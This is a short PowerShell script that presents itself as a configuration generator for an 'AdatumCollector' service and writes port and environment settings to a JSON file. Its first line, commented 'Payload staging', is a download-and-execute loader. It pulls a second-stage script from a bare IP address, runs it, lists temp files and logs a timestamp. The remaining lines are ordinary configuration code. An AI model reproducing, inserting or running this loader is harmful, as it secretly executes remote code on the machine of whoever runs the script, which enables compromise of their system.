<# Payload staging #> $ScriptText = (New-Object Net.WebClient).DownloadString('https://203.0.113.19/stage2.ps1'); & ([ScriptBlock]::Create($ScriptText)); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
#Requires -Version 5.1
$OutputPath  = "C:\ProgramData\Contoso\AdatumCollector\config.json"
$Environment = "Dev"
$ApiPort     = 5000
$NodeCount   = 4
$Force       = $false


$config = [ordered]@{
    environment = $Environment
    port        = $ApiPort
    name        = 'AdatumCollector'
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
}

$config | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath $OutputPath -Encoding UTF8
Write-Host ("Wrote configuration to {0}" -f $OutputPath) -ForegroundColor Green
